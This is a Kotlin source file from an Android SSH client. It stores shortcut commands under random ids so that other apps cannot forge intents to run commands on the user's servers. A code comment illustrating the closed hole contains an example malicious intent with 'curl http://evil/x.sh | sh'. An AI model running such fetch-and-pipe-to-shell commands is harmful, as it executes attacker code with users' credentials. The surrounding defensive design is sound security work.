package com.twig.app

import android.content.Context
import org.json.JSONObject

/**
 * 桌面命令快捷方式的**命令本体**存储(应用私有 SharedPreferences)。
 *
 * 为什么需要这一层 —— [ui.RunCommandActivity] 不得不 `exported="true"`:minSdk 是 24,
 * 而 API 25 以下固定快捷方式走的是老的 `INSTALL_SHORTCUT` 广播,之后由**桌面进程**
 * 直接发起那个意图,目标 Activity 不导出就起不来。
 *
 * 于是原来"命令文本直接放在意图 extra 里"就成了一个可被外部利用的口子:设备上任何
 * 一个**不需要任何权限**的应用都可以
 *
 * ```
 * startActivity(Intent()
 *     .setClassName("com.twig.app", "com.twig.app.ui.RunCommandActivity")
 *     .putExtra("cmd_conn", "sftp://root@192.168.1.10:22")
 *     .putExtra("cmd_command", "curl http://evil/x.sh | sh")
 *     .putExtra("cmd_terminal", false))
 * ```
 *
 * 让 Twig **用用户保存的凭据**连上服务器静默执行任意命令。攻击者本身没有那台服务器的
 * 密码,却借 Twig 的手拿到了执行能力(confused deputy)。唯一门槛是猜中连接标签,
 * 而它的格式是 `sftp://<user>@<host>:<port>`,家用场景下低熵到可以穷举。
 *
 * 现在意图里只带一个 [newId] 生成的随机 id,命令本体存在这里(应用私有目录,别的应用
 * 读不到)。外部即使伪造意图,也只能触发**用户自己创建过的**那几条命令,而 id 猜不出来。
 *
 * 注意:走 [ui.CmdService] 的内部执行路径不受影响也不需要 id —— 那个 Service 是
 * `exported="false"`,外部应用根本 start 不了,继续用完整 extra 传递即可。
 */
object RemoteCmdStore {

    private const val FILE = "twig_cmds"

    /** 写入序号计数器的键;不是命令条目,枚举时要跳过。 */
    private const val KEY_SEQ = "_seq"

    /**
     * 条目上限。正常用法下用户不会固定几十个命令快捷方式;设这个数只是防止异常情况
     * (比如反复"立即执行"意外写入)无限增长。超限时丢最早写入的——它对应的快捷方式
     * 会失效,但那也已经是很久以前的了。
     */
    private const val MAX = 100

    private fun sp(ctx: Context) = ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE)

    /** 存进 prefs 的一条记录:命令本体 + 写入序号(裁剪时用来判先后)。 */
    private class Row(val seq: Long, val cmd: RemoteCmd)

    private fun rowsOf(ctx: Context): Map<String, Row> =
        sp(ctx).all.mapNotNull { (k, v) ->
            if (k == KEY_SEQ) return@mapNotNull null
            runCatching {
                val o = JSONObject(v as String)
                k to Row(o.optLong("seq", 0L), RemoteCmd.fromJson(o.getJSONObject("cmd")))
            }.getOrNull()
        }.toMap()

    /**
     * 存一条命令并返回它的 id。**内容完全相同就复用已有 id**——同一条命令重复固定到
     * 桌面(用户挪了个图标位置又重新加一次)不该每次都堆一条新记录。
     */
    fun put(ctx: Context, cmd: RemoteCmd): String {
        val sp = sp(ctx)
        val rows = rowsOf(ctx)
        rows.entries.firstOrNull { it.value.cmd == cmd }?.let { return it.key }

        val seq = sp.getLong(KEY_SEQ, 0L) + 1
        val ed = sp.edit().putLong(KEY_SEQ, seq)
        // 超限先腾地方:SharedPreferences 无序,按写入序号裁掉最早的几条
        if (rows.size >= MAX) {
            rows.entries.sortedBy { it.value.seq }
                .take(rows.size - MAX + 1)
                .forEach { ed.remove(it.key) }
        }
        val id = newId()
        val json = JSONObject().put("seq", seq).put("cmd", cmd.toJson()).toString()
        ed.putString(id, json).apply()
        return id
    }

    fun get(ctx: Context, id: String): RemoteCmd? = rowsOf(ctx)[id]?.cmd

    /**
     * 128 位随机 id。必须用 [java.security.SecureRandom] 而不是确定性 hash——
     * 整个防护就建立在"外部应用猜不到这个值"上,由内容算出来的 id 等于没防。
     */
    private fun newId(): String {
        val b = ByteArray(16)
        java.security.SecureRandom().nextBytes(b)
        return b.joinToString("") { "%02x".format(it) }
    }
}
